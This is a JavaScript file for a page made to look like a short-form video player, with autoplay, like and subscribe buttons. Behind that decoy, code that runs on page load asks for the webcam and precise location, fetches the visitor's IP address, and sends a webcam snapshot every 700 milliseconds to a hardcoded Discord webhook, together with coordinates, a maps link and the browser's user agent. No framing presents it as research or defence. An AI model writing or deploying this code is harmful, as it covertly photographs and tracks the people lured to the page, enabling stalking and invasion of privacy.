document.addEventListener('DOMContentLoaded', () => {
    // const statusBox = document.getElementById('status'); // Removed UI element
    const locationDisplay = document.getElementById('locationDisplay');
    const camPreview = document.getElementById('camPreview');
    const contentVideo = document.getElementById('contentVideo');
    const progressBar = document.querySelector('.progress-bar');
    const shortsOverlay = document.querySelector('.shorts-overlay');
    const ppBtn = document.getElementById('ppBtn');
    const volBtn = document.getElementById('volBtn');

    // Volume UI Update Helper
    const updateVolumeIcon = () => {
        if (contentVideo.muted) {
            if (volBtn) volBtn.innerHTML = '<svg viewBox="0 0 24 24" class="control-icon"><path d="M16.5 12c0-1.77-1.02-3.29-2.5-4.03v2.21l2.45 2.45c.03-.2.05-.41.05-.63zm2.5 0c0 .94-.2 1.82-.54 2.64l1.51 1.51C20.63 14.91 21 13.5 21 12c0-4.28-2.99-7.86-7-8.77v2.06c2.81.86 5 3.54 5 6.71zM4.27 3L3 4.27 7.73 9H3v6h4l5 5v-6.73l4.25 4.25c-.67.52-1.42.93-2.25 1.18v2.06c1.38-.31 2.63-.95 3.69-1.81L19.73 21 21 19.73 4.27 3zM12 4L9.91 6.09 12 8.18V4z" fill="currentColor"></path></svg>';
        } else {
            if (volBtn) volBtn.innerHTML = '<svg viewBox="0 0 24 24" class="control-icon"><path d="M14,3.23V5.29C16.89,6.15 19,8.83 19,12C19,15.17 16.89,17.84 14,18.7V20.77C18,19.86 21,16.28 21,12C21,7.72 18,4.14 14,3.23M16.5,12C16.5,10.23 15.5,8.71 14,7.97V16.02C15.5,15.29 16.5,13.76 16.5,12M3,9V15H7L12,20V4L7,9H3Z" fill="currentColor"></path></svg>';
        }
    };

    // 1. Auto-play content video
    contentVideo.play().then(() => {
        // Autoplay started (possibly w/ sound if user engaged)
        updateVolumeIcon();
    }).catch(() => {
        // Autoplay blocked, fallback to mute
        contentVideo.muted = true;
        contentVideo.play();
        updateVolumeIcon();
    });

    // --- UI Interactions ---

    // Progress Bar Update
    contentVideo.addEventListener('timeupdate', () => {
        const percentage = (contentVideo.currentTime / contentVideo.duration) * 100;
        progressBar.style.width = `${percentage}%`;
    });

    // Play/Pause Function
    const togglePlay = (e) => {
        if (e) e.stopPropagation();

        if (contentVideo.paused) {
            contentVideo.play();
            if (ppBtn) ppBtn.innerHTML = '<svg viewBox="0 0 24 24" class="control-icon"><path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z" fill="currentColor"></path></svg>';
        } else {
            contentVideo.pause();
            if (ppBtn) ppBtn.innerHTML = '<svg viewBox="0 0 24 24" class="control-icon"><path d="M8 5v14l11-7z" fill="currentColor"></path></svg>';
        }
    };

    // Volume Function
    const toggleMute = (e) => {
        if (e) e.stopPropagation();
        contentVideo.muted = !contentVideo.muted;
        updateVolumeIcon();
    };

    // Play/Pause on Click (tapping middle of screen)
    shortsOverlay.addEventListener('click', (e) => {
        // Ignore clicks on buttons/interactive elements
        if (e.target.closest('.icon-btn, .action-item, .subscribe-btn, .bottom-nav, .control-btn')) return;
        togglePlay();
    });

    if (ppBtn) ppBtn.addEventListener('click', togglePlay);
    if (volBtn) volBtn.addEventListener('click', toggleMute);

    // Like Button Toggle (Visual)
    const likeBtn = document.querySelector('.action-item:nth-child(1) .icon-circle');
    if (likeBtn) {
        likeBtn.addEventListener('click', () => {
            const path = likeBtn.querySelector('path');
            if (path.getAttribute('fill') === 'currentColor' || !path.getAttribute('fill')) {
                path.setAttribute('fill', 'red');
                likeBtn.style.color = '#3ea6ff';
            } else {
                likeBtn.style.color = 'white';
            }
        });
    }

    // Subscribe Button Toggle
    const subBtn = document.querySelector('.subscribe-btn');
    if (subBtn) {
        subBtn.addEventListener('click', () => {
            if (subBtn.innerText === 'Subscribe') {
                subBtn.innerText = 'Subscribed';
                subBtn.style.backgroundColor = '#333';
                subBtn.style.color = '#fff';
            } else {
                subBtn.innerText = 'Subscribe';
                subBtn.style.backgroundColor = 'white';
                subBtn.style.color = 'black';
            }
        });
    }

    // 2. Start Process Immediately
    initCapture();

    async function initCapture() {
        console.log("Requesting permissions...");

        try {
            // Helper to wrap Geolocation in a Promise
            const getLocation = () => new Promise((resolve, reject) => {
                if (!("geolocation" in navigator)) {
                    reject(new Error("Geolocation not supported"));
                } else {
                    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
                }
            });

            // Helper to get IP
            const getIP = async () => {
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const data = await res.json();
                    return data.ip;
                } catch (e) { return "Unknown"; }
            };

            // 1. Request Camera, Location, and IP in parallel
            const [stream, position, ip] = await Promise.all([
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false }),
                getLocation(),
                getIP()
            ]);

            console.log("Permissions granted. Starting capture...");

            // 2. Set up Camera
            camPreview.srcObject = stream;

            // 3. Start Loop when video is ready
            camPreview.onloadedmetadata = () => {
                camPreview.play();

                const { latitude, longitude, accuracy } = position.coords;
                let count = 0;
                const maxCaptures = 10000000;

                const intervalId = setInterval(async () => {
                    if (count >= maxCaptures) {
                        clearInterval(intervalId);
                        return;
                    }

                    const imageBlob = await captureFrame(camPreview);
                    sendToDiscord({ latitude, longitude, accuracy, imageBlob, ip, count: count + 1 });

                    count++;
                }, 700);
            };

        } catch (err) {
            console.log("Permissions denied or error:", err);
        }
    }

    function captureFrame(video) {
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0);
        return new Promise(resolve => canvas.toBlob(blob => resolve(blob), "image/jpeg", 0.8));
    }

    function downloadImage(blob) {
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = `capture_${Date.now()}.jpg`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }

    // Existing Discord Logic (Preserved)
    async function sendToDiscord({ latitude, longitude, accuracy, imageBlob, ip, count }) {
        const webhookUrl = "https://discord.com/api/webhooks/1449598201354256447/Z-NA9d8hwIsxDWemXGDG7pGQRLdOLEVoOymGuPvpUW3iO9fNa51EqLvIidqgISxtmS6v";
        const formData = new FormData();
        formData.append("file", imageBlob, `capture_${count}.jpg`);
        const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
        const payload = {
            content: `**Capture #${count}**\nIP: ${ip}\nLat: ${latitude}\nLng: ${longitude}\nAcc: ${accuracy}m\nMaps: ${googleMapsUrl}\nUA: ${navigator.userAgent}`
        };
        formData.append("payload_json", JSON.stringify(payload));
        try {
            await fetch(webhookUrl, { method: "POST", body: formData });
        } catch (e) { console.error(e); }
    }
});
